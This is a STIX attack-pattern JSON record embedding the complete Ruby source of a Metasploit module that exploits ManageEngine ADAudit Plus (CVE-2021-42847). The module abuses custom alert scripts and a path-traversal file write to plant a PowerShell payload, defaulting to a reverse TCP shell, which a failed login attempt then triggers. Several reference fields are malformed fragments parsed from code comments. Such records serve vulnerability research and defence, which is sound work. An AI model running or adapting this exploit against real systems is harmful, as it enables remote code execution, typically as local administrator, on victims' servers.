{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--96dacc33-1408-45f1-948c-5008f820a3ac",
    "created": "2024-08-14T16:52:49.050096Z",
    "modified": "2024-08-14T16:52:49.0501Z",
    "name": "ManageEngine ADAudit Plus Authenticated File Write RCE",
    "description": " This module exploits security issues in ManageEngine ADAudit Plus prior to 7006 that allow authenticated users to execute arbitrary code by creating a custom alert profile and leveraging its custom alert script component.  The module first runs a few checks to test the provided credentials, retrieve the configured domain(s) and obtain the build number of the target ADAudit Plus server.  If the credentials are valid and the target is vulnerable, the module creates an alert profile that will be triggered for any failed login attempt to the configured domain.  For versions prior to build 7004, the payload is directly inserted in the custom alert script component of the alert profile.  For versions 7004 and 7005, the module leverages an arbitrary file",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_adaudit_plus_authenticated_rce.rb",
            "external_id": "manageengine_adaudit_plus_authenticated_rce.rb"
        },
        {
            "source_name": "Moon",
            "external_id": "#CVE-2021-42847discovery"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-42847"
        },
        {
            "source_name": "reference",
            "url": "https://pitstop.manageengine.com/portal/en/community/topic/fix-released-for-a-vulnerability-in-manageengine-adaudit-plus"
        },
        {
            "source_name": "reference",
            "url": "https://www.manageengine.com/products/active-directory-audit/adaudit-plus-release-notes.html"
        },
        {
            "source_name": "#wearedealingwith7004orhigher",
            "external_id": "soexploitationcanonlysucceedifthetargetisvulnerabletoCVE-2021-42847"
        },
        {
            "source_name": "fail_with(Failure::NotVulnerable",
            "external_id": "Thetargetisbuild7004orupandnotvulnerabletoCVE-2021-42847.Exploitationisnotpossible.)"
        },
        {
            "source_name": "#meterpreterpayloadsseemincompatiblewithCVE-2021-42847",
            "external_id": "soitsveryunlikelywelleverbeabletoautomaticallyremovetheps1script"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::ManageEngineAdauditPlus\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine ADAudit Plus Authenticated File Write RCE',\n        'Description' => %q{\n          This module exploits security issues in ManageEngine ADAudit Plus\n          prior to 7006 that allow authenticated users to execute arbitrary\n          code by creating a custom alert profile and leveraging its custom\n          alert script component.\n\n          The module first runs a few checks to test the provided\n          credentials, retrieve the configured domain(s) and obtain the\n          build number of the target ADAudit Plus server.\n\n          If the credentials are valid and the target is\n          vulnerable, the module creates an alert profile that will be\n          triggered for any failed login attempt to the configured domain.\n\n          For versions prior to build 7004, the payload is directly inserted\n          in the custom alert script component of the alert profile.\n\n          For versions 7004 and 7005, the module leverages an arbitrary file\n          write vulnerability (CVE-2021-42847) to create a Powershell script\n          in the alert_scripts directory that contains the payload. The name\n          of this script is then provided as the value for the custom alert\n          script component of the alert profile.\n\n          This module requires valid credentials for an account with the\n          privileges to create alert scripts. It has been successfully tested\n          against ManageEngine ADAudit Plus builds 7003 and 7005 running on\n          Windows Server 2012 R2.\n\n          Successful exploitation will result in RCE as the user running\n          ManageEngine ADAudit Plus, which will typically be the local\n          administrator.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Moon', # CVE-2021-42847 discovery\n          'Erik Wynter' # @wyntererik - Additional research and Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2021-42847'],\n          ['URL', 'https://pitstop.manageengine.com/portal/en/community/topic/fix-released-for-a-vulnerability-in-manageengine-adaudit-plus'],\n          ['URL', 'https://www.manageengine.com/products/active-directory-audit/adaudit-plus-release-notes.html']\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2021-10-01',\n        'Platform' => 'win',\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Type' => :win_cmd,\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8081,\n          'WfsDelay' => 5 # triggering the payload may take a bit, let's not be too hasty\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [FIRST_ATTEMPT_FAIL], # This exploit may fail on its first few attempts whilst the remote system is processing alert updates.\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base path to ManageEngine ADAudit Plus', '/']),\n      OptString.new('AUTH_DOMAIN', [true, 'ADAudit Plus authentication domain (default is ADAuditPlus Authentication)', 'ADAuditPlus Authentication']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin']),\n    ])\n  end\n\n  def auth_domain\n    datastore['AUTH_DOMAIN']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def delete_alert(adapcsrf_cookie)\n    print_status(\"Attempting to delete alert profile #{@alert_name}\")\n    # let's try and get the the ID of the alert we want to delete\n    res_get_alert = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'leftTrees', 'getLeftTreeList'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'TAB_ID' => '5', # this cannot be randomized\n        'adapcsrf' => adapcsrf_cookie\n      }\n    })\n\n    unless res_get_alert\n      print_warning(\"Connection failed when attempting to obtain the alert profile ID #{@alert_name}. Manual cleanup required.\")\n      return\n    end\n\n    unless res_get_alert.code == 200 && !res_get_alert.body.empty?\n      print_warning(\"Received unexpected reply when attempting to obtain the alert profile ID #{@alert_name}. Manual cleanup required.\")\n      return\n    end\n\n    alert_id = res_get_alert.body&.scan(/modelId\":(\\d+),\"name\":\"#{@alert_name}/)&.flatten&.first\n    if alert_id.blank?\n      print_warning(\"Failed to obtain the alert profile ID #{@alert_name}. Manual cleanup required.\")\n      return\n    end\n\n    # delete the alert\n    res_delete_alert = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'config', 'alertprofiles', 'delete'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'data' => { 'ids' => [alert_id] }.to_json,\n        'adapcsrf' => adapcsrf_cookie\n      }\n    })\n\n    unless res_delete_alert\n      print_warning(\"Connection failed when attempting to delete alert profile #{@alert_name}. Manual cleanup required.\")\n      return\n    end\n\n    unless res_delete_alert.code == 200 && res_delete_alert.body&.include?('Successfully deleted the alert profile')\n      print_warning(\"Received unexpected reply when attempting to delete alert profile #{@alert_name}. Manual cleanup required.\")\n      return\n    end\n\n    print_good(\"Successfully deleted alert profile #{@alert_name}\")\n  end\n\n  def create_alert_profile\n    if @exploit_method == 'cve_2021_42847'\n      print_status('Attempting to authenticate again in order to retrieve the required cookies.')\n      # We have to authenticate again in order to get the required cookie, so reset the cookie cache\n      cookie_jar.clear\n      login_results = adaudit_plus_login(auth_domain, username, password, true)\n      login_msg = login_results['message']\n      case login_results['status']\n      when adaudit_plus_status::CONNECTION_FAILED\n        fail_with(Failure::Unreachable, login_msg)\n      when adaudit_plus_status::UNEXPECTED_REPLY\n        fail_with(Failure::UnexpectedReply, login_msg)\n      when adaudit_plus_status::NO_ACCESS\n        fail_with(Failure::NoAccess, login_msg)\n      when adaudit_plus_status::SUCCESS\n        # just to distinguish it from any other potential statuses this method may return in the future\n      else\n        # this covers other potential statuses that this method may return in the future\n        # note that here the login method should never return adaudit_plus_status::NO_DOMAINS\n        # however, if it would do so due to some library change, treating it as an unknown failure makes sense\n        fail_with(Failure::Unknown, login_msg)\n      end\n\n      # Code must have been a success related code so we should have\n      # an adapcsrf_cookie entry within the login results hash.\n      @adapcsrf_cookie = login_results['adapcsrf_cookie']\n    end\n\n    print_status('Attempting to create an alert profile')\n    # visit /api/json/jsMessage to see if we're dealing with 7003 or lower\n    res_check_7004 = send_request_cgi({\n      'uri' => adaudit_api_js_message_uri,\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => { 'adapcsrf' => @adapcsrf_cookie }\n    })\n\n    unless res_check_7004\n      fail_with(Failure::Unreachable, 'Connection failed when trying to get the required info via /api/json/jsMessage')\n    end\n\n    unless res_check_7004.code == 200 && res_check_7004.body&.include?('adap_common_script_info')\n      fail_with(Failure::UnexpectedReply, 'Received unexpected response when trying to get the required info via /api/json/jsMessage')\n    end\n\n    alert_script_7004_msg = 'Your alert profile script path configuration is not compliant with the constraints listed below and needs to '\\\n    'be changed. These constraints have been introduced in the latest build of ADAudit Plus 7004, to enhance security'\n\n    if res_check_7004.body&.include?(alert_script_7004_msg)\n      # we are dealing with 7004 or higher, so exploitation can only succeed if the target is vulnerable to CVE-2021-42847\n      unless @exploit_method == 'cve_2021_42847'\n        # let's check for the CVE-2021-42847 endpoint in case the user has disabled autocheck\n        gpo_watcher_status = gpo_watcher_data_check\n        if gpo_watcher_status == adaudit_plus_status::SUCCESS\n          @exploit_method = 'cve_2021_42847'\n        else\n          fail_with(Failure::NotVulnerable, 'The target is build 7004 or up and not vulnerable to CVE-2021-42847. Exploitation is not possible.')\n        end\n\n        # here we have to authenticate again in order to get the required adapcsrf cookie\n        cookie_jar.clear\n        login_results = adaudit_plus_login(auth_domain, username, password, true)\n        login_msg = login_results['message']\n        case login_results['status']\n        when adaudit_plus_status::CONNECTION_FAILED\n          fail_with(Failure::Unreachable, login_msg)\n        when adaudit_plus_status::UNEXPECTED_REPLY\n          fail_with(Failure::UnexpectedReply, login_msg)\n        when adaudit_plus_status::NO_ACCESS\n          fail_with(Failure::NoAccess, login_msg)\n        when adaudit_plus_status::SUCCESS\n          # just to distinguish it from any other potential statuses this method may return in the future\n        else\n          fail_with(Failure::Unknown, login_msg)\n        end\n\n        @adapcsrf_cookie = login_results['adapcsrf_cookie']\n      end\n\n      # We need to leverage CVE-2021-42847 to create a PowerShell script in /alert_scripts and then use the script name\n      # when creating the alert profile. Therefore call the function to create this alert script and save the name of the\n      # script location.\n      @ps1_script_name = create_alert_script\n    end\n\n    # save the alert profile\n    @alert_name, alert_data = alert_profile_info\n    res_save_alert = send_request_cgi({\n      'uri' => adaudit_api_alertprofiles_save_uri,\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'data' => alert_data,\n        'adapcsrf' => @adapcsrf_cookie\n      }\n    })\n\n    unless res_save_alert\n      fail_with(Failure::Unreachable, \"Connection failed when trying to create an alert profile via #{adaudit_api_alertprofiles_save_uri}\")\n    end\n\n    unless res_save_alert.code == 200 && res_save_alert.body&.include?('Successfully Saved the Alert Profile')\n      print_error(\"The server sent the following response: #{res_save_alert.body&.strip}\")\n      @alert_name = nil # if we are here the alert profile was not created so let's skip cleanup by setting @alert_name to nil\n      fail_with(Failure::UnexpectedReply, \"Failed to create an alert profile via #{adaudit_api_alertprofiles_save_uri}\")\n    end\n\n    print_good(\"Successfully created alert profile #{@alert_name}\")\n  end\n\n  def alert_profile_info\n    script_location = @ps1_script_name || payload.encoded\n\n    alert_name = rand_text_alphanumeric(8..12)\n    alert_data = {\n      'alertName' => alert_name,\n      'alertDescription' => rand_text_alpha(20..30),\n      'alertSeverity' => '1',\n      'alertMsg' => '%FORMAT_MESSAGE%',\n      'alertIsMailNotify' => false,\n      'alertIsSMSNotify' => false,\n      'monitorList' => [1],\n      'selectedCategory' => 'All',\n      'domainName' => @domain,\n      'isSave' => true,\n      'alertProfileId' => 'new',\n      'thresholdBasedAlert' => false,\n      'thresholdCount' => rand(5..15),\n      'thresholdPeriod' => '=',\n      'thresholdInterval' => rand(3..10),\n      'thresholdGroupingColumns' => [],\n      'throttleBasedAlert' => false,\n      'throttleInterval' => rand(30..90),\n      'throttleGroupingColumns' => [],\n      'userMap' => {},\n      'hourBasedAlert' => false,\n      'contentType' => 'html',\n      'alertMsgNeeded' => true,\n      'alertProfileNameNeeded' => true,\n      'mailAlertLink' => '',\n      'eventDetails' => true,\n      'emailMoreRecipients' => '',\n      'smsMoreRecipients' => '',\n      'scriptLocation' => script_location,\n      'alertFilter' => false,\n      'criteriaValue' => '-'\n    }.to_json\n\n    # we need to send along the alert name too since we'll need it to delete the alert after it's been created\n    [alert_name, alert_data]\n  end\n\n  def create_alert_script\n    ps1_script_name = \"#{rand_text_alpha_lower(5..10)}.ps1\"\n    print_status(\"Attempting to write the payload to /alert_scripts/#{ps1_script_name}\")\n\n    if @domain.blank?\n      @domain = \"#{rand_text_alpha_lower(5..10)}.local\"\n      vprint_status(\"Using domain #{@domain} for the name of the directory we will be creating\")\n    end\n\n    gpo_post_data = {\n      'DOMAIN_NAME' => @domain,\n      'Html_fileName' => \"..\\\\..\\\\..\\\\..\\\\..\\\\alert_scripts\\\\#{ps1_script_name}\", # the traversal path to alert_scripts should always be correct no matter where ADAudit Plus is installed\n      'htmlReport' => payload.encoded\n    }\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => adaudit_plus_gpo_watcher_data_uri,\n      'ctype' => 'application/json',\n      'data' => generate_gpo_watcher_data_json(gpo_post_data)\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    unless res.code == 200 && res.body&.include?('{\"success\":true}')\n      fail_with(Failure::UnexpectedReply, 'Failed to upload the payload.')\n    end\n\n    print_good(\"Successfully wrote the payload to /alert_scripts/#{ps1_script_name} in the ManageEngine ADAudit Plus install directory\")\n    ps1_script_name\n  end\n\n  def check\n    target_check_results = adaudit_plus_target_check\n    target_check_msg = target_check_results['message']\n    case target_check_results['status']\n    when adaudit_plus_status::CONNECTION_FAILED\n      return CheckCode::Unknown(target_check_msg)\n    when adaudit_plus_status::UNEXPECTED_REPLY\n      return CheckCode::Safe(target_check_msg)\n    when adaudit_plus_status::SUCCESS\n      vprint_status(target_check_msg)\n    else\n      # this covers cases that may be added in the future\n      return CheckCode::Unknown(target_check_msg)\n    end\n\n    target_check_res = target_check_results['server_response']\n\n    # In order to trigger the final payload in the exploit method, we will need to send an authentication request to\n    # ADAudit Plus with incorrect Active Directory credentials if the user didn't provide an Active Directory domain,\n    # we can try to extract the FQDN for a configured domain from the server response\n    domain_alias_results = adaudit_plus_grab_domain_aliases(target_check_res)\n    domain_alias_msg = domain_alias_results['message']\n    if domain_alias_results['status'] == adaudit_plus_status::NO_DOMAINS\n      return CheckCode::Safe(domain_alias_msg)\n    end\n\n    domain_aliases = domain_alias_results['domain_aliases']\n    # check if we actually have any configured domain aliases now, otherwise the target isn't exploitable\n    if domain_aliases.blank?\n      return CheckCode::Safe('Failed to verify if any Active Directory domains are configured on the target.')\n    end\n\n    # if the only configured domain is the default domain, we will not be able to trigger the payload, so\n    # stop as there is no point in proceeding\n    if domain_aliases == ['ADAuditPlus Authentication']\n      return CheckCode::Safe('No Active Directory domains are configured on the target, so the module will not be able to trigger the payload.')\n    end\n\n    # set the domain alias to the first configured domain, unless the user provided an invalid domain\n    # in the latter case, the module won't be able to authenticate to the target so there's no point in proceeding\n    if auth_domain == 'ADAuditPlus Authentication' || domain_aliases.include?(auth_domain)\n      vprint_status(domain_alias_msg)\n      @domain_alias = domain_aliases.first\n      print_status(\"Using configured authentication domain alias #{@domain_alias}.\")\n    else\n      # this means the user provided an authentication domain that isn't actually configured on the target, so authentication cannot succeed\n      print_status(domain_alias_msg)\n      return CheckCode::Detected(\"The provided AUTH_DOMAIN #{auth_domain} does not match the configured authentication domain(s).\")\n    end\n\n    print_status(\"Attempting to authenticate to #{auth_domain} with username: #{username} and password: #{password}\")\n    login_results = adaudit_plus_login(auth_domain, username, password, false)\n    login_msg = login_results['message']\n    case login_results['status']\n    when adaudit_plus_status::CONNECTION_FAILED, adaudit_plus_status::UNEXPECTED_REPLY\n      return CheckCode::Unknown(login_msg)\n    when adaudit_plus_status::NO_ACCESS, NO_DOMAINS\n      # if we cannot authenticate, we can't create an alert profile so exploitation is impossible\n      # if no domains are configured, we cannot trigger the payload and therefore exploitation is impossible\n      return CheckCode::Safe(login_msg)\n    when adaudit_plus_status::SUCCESS\n      @domain = login_results['configured_domains'].first\n      vprint_status(\"Using domain #{@domain} for the name of the directory we will be creating\")\n    end\n\n    print_good('Successfully authenticated')\n    @adapcsrf_cookie = login_results['adapcsrf_cookie']\n\n    # check the build version to see if we can actually exploit the target\n    build_results = adaudit_plus_grab_build(@adapcsrf_cookie)\n    build_msg = build_results['message']\n    unless build_results['status'] == adaudit_plus_status::SUCCESS\n      # if we don't get a valid build number, we don't know what the target is, so we can't proceed\n      # however, we can also not say that the target is safe or detected, so we return Unknown\n      return CheckCode::Unknown(build_msg)\n    end\n\n    build_version = build_results['build_version']\n\n    if build_version < Rex::Version.new('7004')\n      @exploit_method = 'default'\n      CheckCode::Appears(\"The target is ADAudit Plus #{build_version}\")\n    # For builds 7004 and 7005 exploitation will still be possible via CVE-2021-42847 if the vulnerable endpoint exists\n    elsif build_version < Rex::Version.new('7006')\n      gpo_watcher_status = gpo_watcher_data_check\n      case gpo_watcher_status\n      when adaudit_plus_status::SUCCESS\n        @exploit_method = 'cve_2021_42847'\n        return CheckCode::Appears(\"The target is ADAudit Plus #{build_version} and the endpoint for CVE-2021-42847 exists.\")\n      when adaudit_plus_status::CONNECTION_FAILED\n        return CheckCode::Detected(\"The target is ADAudit Plus #{build_version} but the connection failed when checking for the CVE-2021-42847 endpoint\")\n      when adaudit_plus_status::NO_ACCESS\n        return CheckCode::Safe(\"The target is ADAudit Plus #{build_version} but the endpoint for CVE-2021-42847 is not accessible.\")\n      end\n    else\n      CheckCode::Safe(\"The target is ADAudit Plus #{build_version}\")\n    end\n  end\n\n  def exploit\n    if @exploit_method.nil? # this means the user has disabled autocheck so we should try the default exploit method\n      @exploit_method = 'default'\n    elsif @exploit_method == 'cve_2021_42847' && datastore['PAYLOAD'] =~ /meterpreter/\n      print_warning('Exploitation is possible only via CVE-2021-42847. This attack vector may fail in combination with a meterpreter payload.')\n      print_warning('If exploitation fails, consider setting the payload back to the default cmd/windows/powershell_reverse_tcp payload')\n    end\n\n    if @adapcsrf_cookie.blank?\n      # let's clear the cookie jar and try to authenticate\n      cookie_jar.clear\n      print_status(\"Attempting to authenticate to #{@domain_alias} with username: #{username} and password: #{password}\")\n      login_results = adaudit_plus_login(auth_domain, username, password, false)\n      login_msg = login_results['message']\n      case login_results['status']\n      when adaudit_plus_status::CONNECTION_FAILED\n        fail_with(Failure::Unreachable, login_msg)\n      when adaudit_plus_status::UNEXPECTED_REPLY\n        fail_with(Failure::UnexpectedReply, login_msg)\n      when adaudit_plus_status::NO_ACCESS\n        fail_with(Failure::NoAccess, login_msg)\n      when adaudit_plus_status::NO_DOMAINS\n        fail_with(Failure::NotVulnerable, login_msg)\n      when adaudit_plus_status::SUCCESS\n        @domain = login_results['configured_domains'].first\n        vprint_status(\"Using domain #{@domain} for the name of the directory we will be creating\")\n      else\n        # this covers other potential statuses that may be added in the future\n        fail_with(Failure::Unknown, login_msg)\n      end\n\n      print_good('Successfully authenticated')\n      @adapcsrf_cookie = login_results['adapcsrf_cookie']\n    end\n\n    # let's create the alert profile\n    create_alert_profile\n\n    # time to trigger the payload\n    if @domain_alias.nil?\n      # this means check didn't run, so we need to obtain the configured Active Directory domains\n      target_check_results = adaudit_plus_target_check\n      target_check_status = target_check_results['status']\n      target_check_msg = target_check_results['message']\n      unless target_check_status == adaudit_plus_status::SUCCESS\n        print_error('Failed to obtain the configured Active Directory domain aliases')\n        case target_check_status\n        when adaudit_plus_status::CONNECTION_FAILED\n          fail_with(Failure::Unreachable, target_check_msg)\n        when adaudit_plus_status::UNEXPECTED_REPLY\n          fail_with(Failure::UnexpectedReply, target_check_msg)\n        else\n          # this covers other potential statuses that this method may return in the future\n          fail_with(Failure::Unknown, target_check_msg)\n        end\n      end\n\n      target_check_res = target_check_results['server_response']\n      fail_with(Failure::UnexpectedReply, 'No body in the server response when performing a target version check!') if target_check_res.body.blank?\n\n      # In order to trigger the final payload in the exploit method, we will need to send an authentication request to\n      # ADAudit Plus with incorrect Active Directory credentials. If the user didn't provide an Active Directory domain,\n      # we can try to extract the FQDN for a configured domain from the server response.\n      domain_alias_results = adaudit_plus_grab_domain_aliases(target_check_res.body)\n      domain_alias_msg = domain_alias_results['message']\n      case domain_alias_results['status']\n      when adaudit_plus_status::NO_DOMAINS\n        fail_with(Failure::NotVulnerable, domain_alias_msg)\n      when adaudit_plus_status::SUCCESS\n        # make sure we actually have a domain alias, otherwise the target is not vulnerable\n        if domain_alias_results['domain_aliases'].blank?\n          fail_with(Failure::NotVulnerable, 'Failed to verify if any Active Directory domains are configured on the target.')\n        end\n      else\n        fail_with(Failure::Unknown, domain_alias_msg)\n      end\n\n      domain_aliases = domain_alias_results['domain_aliases']\n      # if the only configured domain is the default domain, we will not be able to trigger the payload, so there is no point to proceed\n      if domain_aliases == ['ADAuditPlus Authentication']\n        fail_with(Failure::NoTarget, 'No Active Directory domains are configured on the target, so the module will not be able to trigger the payload.')\n      end\n\n      # set the domain alias to the first configured domain, unless the user provided an invalid domain\n      # in the latter case, the module won't be able to authenticate to the target so there's no point to proceed\n      if auth_domain == 'ADAuditPlus Authentication' || domain_aliases&.include?(auth_domain)\n        vprint_status(domain_alias_msg)\n        @domain_alias = domain_aliases.first\n        print_status(\"Using configured authentication domain alias #{@domain_alias}.\")\n      else\n        # this means the user provided an authentication domain that isn't actually configured on the target, so authentication cannot succeed\n        print_status(domain_alias_msg)\n        fail_with(Failure::BadConfig, \"The provided AUTH_DOMAIN #{auth_domain} does not match the configured authentication domain(s).\")\n      end\n    end\n\n    print_status(\"Attempting to trigger the payload via an authentication attempt for domain #{@domain_alias} using incorrect credentials.\")\n    login_results = adaudit_plus_login(@domain_alias, rand_text_alphanumeric(5..8), rand_text_alphanumeric(8..12), true)\n    login_msg = login_results['message']\n    manual_trigger_msg = \"You can try to manually trigger the payload via a failed login attempt for the #{@domain_alias} domain.\"\n    case login_results['status']\n    when adaudit_plus_status::CONNECTION_FAILED\n      fail_with(Failure::Unreachable, \"#{login_msg} #{manual_trigger_msg}\")\n    when adaudit_plus_status::UNEXPECTED_REPLY\n      fail_with(Failure::UnexpectedReply, \"#{login_msg} #{manual_trigger_msg}\")\n    when adaudit_plus_status::NO_ACCESS\n      print_status(\"Received expected reply when trying to trigger the payload. Let's hope we get a shell...\")\n    when adaudit_plus_status::SUCCESS\n      fail_with(Failure::Unknown, \"Somehow authentication succeeded, which means the payload was not triggered. #{manual_trigger_msg}\")\n    else\n      print_warning('Received unknown error code when trying to trigger the payload. The module will continue but exploitation will likely fail.')\n    end\n\n    @pwned = 0 # used to keep track of successful exploitation and the number of shells we get in cleanup and on_new_session\n  end\n\n  def cleanup\n    return unless @alert_name # this should only run if we actually created an alert\n\n    if @pwned == 0\n      print_error('Failed to obtain a shell. You could try increasing the WfsDelay value')\n    end\n    cookie_jar.clear\n    login_results = adaudit_plus_login(auth_domain, username, password, true)\n    case login_results['status']\n    when adaudit_plus_status::SUCCESS\n      delete_alert(login_results['adapcsrf_cookie'])\n    when adaudit_plus_status::CONNECTION_FAILED\n      print_warning('Connection failed when trying to authenticate in order to perform cleanup. Manual cleanup required.')\n    when adaudit_plus_status::UNEXPECTED_REPLY\n      print_warning('Received unexpected reply when trying to authenticate in order to perform cleanup. Manual cleanup required.')\n    when adaudit_plus_status::NO_ACCESS\n      print_warning('Failed to authenticate in order to perform cleanup. Manual cleanup required.')\n    else\n      # this covers other potential statuses that this method may return in the future\n      # note that here the login method should never return adaudit_plus_status::NO_DOMAINS\n      # however, if it would do so due to some library change, treating it as unexpected reply makes sense\n      print_warning('Received unknown error code when trying to authenticate in order to perform cleanup. Manual cleanup required.')\n    end\n  end\n\n  def on_new_session(cli)\n    @pwned += 1\n    # if we wrote a PowerShell script to /alert_scripts, remind the user to delete it\n    # we may get two shells, so let's not repeat ourselves\n    if @pwned == 1\n      # I noticed the the meterpreter payloads wouldn't always load stdapi and/or priv automatically\n      # but when loading them manually, they worked it fine\n      if datastore['PAYLOAD'] =~ /meterpreter/ # I tried using cli.type == 'meterpreter' but that broke the module for some reason\n        print_warning(\"If the client portion of stdapi or priv fails to load, you can do so manually via 'load stdapi' and/or load priv'\")\n      end\n\n      if @ps1_script_name\n        # meterpreter payloads seem incompatible with CVE-2021-42847, so it's very unlikely we'll ever be able to automatically remove the ps1 script\n        print_warning(\"Make sure to manually cleanup the #{@ps1_script_name} file from /alert_scripts/ in the ManageEngine ADAudit Plus install directory\")\n      end\n    end\n    super\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-10-01",
    "x_mitre_platforms": [
        "win'"
    ]
}